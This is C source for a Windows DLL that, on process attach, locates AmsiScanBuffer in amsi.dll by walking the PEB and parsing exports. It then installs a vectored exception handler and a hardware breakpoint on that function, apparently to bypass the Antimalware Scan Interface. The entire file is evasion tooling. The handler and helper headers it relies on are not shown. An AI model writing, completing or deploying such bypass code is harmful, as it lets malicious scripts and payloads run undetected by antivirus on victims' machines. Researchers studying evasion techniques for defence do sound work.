#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <stdio.h>
#include <winternl.h>

#include "hardwareBreakpoint.h"
#include "peb.h"
#include "tools.h"


PVOID g_AmsiScanBuffer = NULL;

DWORD WINAPI HookThread(LPVOID lpParam) {
    PVOID pebAddr = pebWalking(L"amsi.dll");
    g_AmsiScanBuffer = peParsing(pebAddr, "AmsiScanBuffer");
    AddVectoredExceptionHandler(1, VEH_Handler);
    SetDR0Breakpoint(g_AmsiScanBuffer);
    return 0;
}

// DllMain function to initialize the DLL : on attach 
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, HookThread, NULL, 0, NULL);
    }
    return TRUE;
}